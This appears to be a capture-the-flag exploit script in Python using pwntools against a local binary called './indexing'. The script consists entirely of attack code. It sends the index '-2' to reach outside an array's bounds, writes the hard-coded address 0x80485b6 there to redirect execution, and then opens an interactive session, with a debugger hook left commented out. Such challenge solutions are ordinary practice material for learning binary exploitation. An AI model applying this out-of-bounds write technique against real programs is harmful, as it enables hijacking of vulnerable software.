#!/usr/bin/env python
from pwn import *

p = process('./indexing')

p.recvuntil('Index: ')
p.sendline('-2')
'''
gdb.attach(p)
raw_input('dam?')
'''
# Give value
p.recvuntil('Value: ')
p.sendline(str(0x80485b6))

p.interactive()
